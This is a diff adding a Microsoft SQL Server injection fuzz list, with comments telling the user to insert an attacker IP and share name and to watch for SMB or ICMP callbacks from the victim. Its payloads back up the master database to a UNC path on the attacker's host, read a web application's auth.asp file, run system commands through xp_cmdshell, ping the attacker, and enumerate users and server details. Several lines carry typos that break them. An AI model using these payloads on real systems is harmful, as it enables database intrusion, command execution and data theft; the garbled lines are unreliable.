@@ -1,0 +1,15 @@
+# might need to terminate payloads with ;--
+# ms-sqli info disclosure payload fuzzfile
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'" select * from myfile"--
+exec master..xp_cmdshell 'ipconfig+/all'
+exec master..xp_cmdshell 'net+users'
+exec master..xp_cmdshell 'net+view'
+exec master..xp_cmdshell 'ping+<attackerip>'
+select * from master..sysserverse
+select * from sysusers
+select @@microsoftversione
+select @@servernamee
+select @@version
